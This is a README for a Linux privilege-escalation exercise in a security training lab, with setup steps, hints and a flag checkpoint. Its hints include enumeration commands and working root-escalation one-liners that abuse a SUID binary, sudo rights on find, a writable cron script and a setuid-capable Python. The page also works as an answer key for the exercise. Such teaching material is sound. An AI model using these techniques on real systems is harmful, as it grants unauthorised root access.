# 04-privesc — Linux privilege escalation

## Objectives

Starting as the low-privilege user `lowpriv`, escalate to `root` and read
`/root/flag.txt`. Re-run the scenario with a different `PRIVESC_PATH` for a
fresh puzzle — each value seeds exactly one escalation path.

## Setup

```bash
./lab up 04-privesc
./lab shell
```

From inside the attacker box, SSH to the target:

```bash
ssh lowpriv@172.28.0.40   # password: lowpriv
```

To pick a specific escalation path (default is `suid` if unset), reset
with `PRIVESC_PATH` set to one of `suid`, `sudo`, `cron`, `cap`:

```bash
PRIVESC_PATH=sudo ./lab reset 04-privesc
```

## Hints

<details><summary>Hint 1</summary>Enumerate first — don't guess. Copy over a
tool like <code>linpeas.sh</code> (e.g. to <code>/opt/privesc/linpeas.sh</code>
on the attacker box, then <code>scp</code> it across) or check SUID
binaries, sudo rights, file capabilities, and cron jobs by hand.</details>

<details><summary>Hint 2</summary>The manual enumeration commands to run on
the target as <code>lowpriv</code>:

```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
getcap -r / 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
```

One of these will point at the seeded path.</details>

<details><summary>Hint 3</summary>The exploitation one-liner depends on
which path is active (see <code>SOLUTION.md</code> for the full
explanation of each):

```bash
# suid
/usr/local/bin/backup -p -c 'cat /root/flag.txt'
# sudo
sudo find . -exec cat /root/flag.txt \; -quit
# cron (wait up to ~60s after overwriting the script for the job to fire)
echo 'cat /root/flag.txt > /tmp/out.txt; chmod 666 /tmp/out.txt' > /usr/local/bin/task.sh
# cap
/usr/local/bin/pypriv -c 'import os; os.setuid(0); os.system("cat /root/flag.txt")'
```

</details>

## Checkpoint

You read `/root/flag.txt` and it starts with `PRIVESC-FLAG{`.
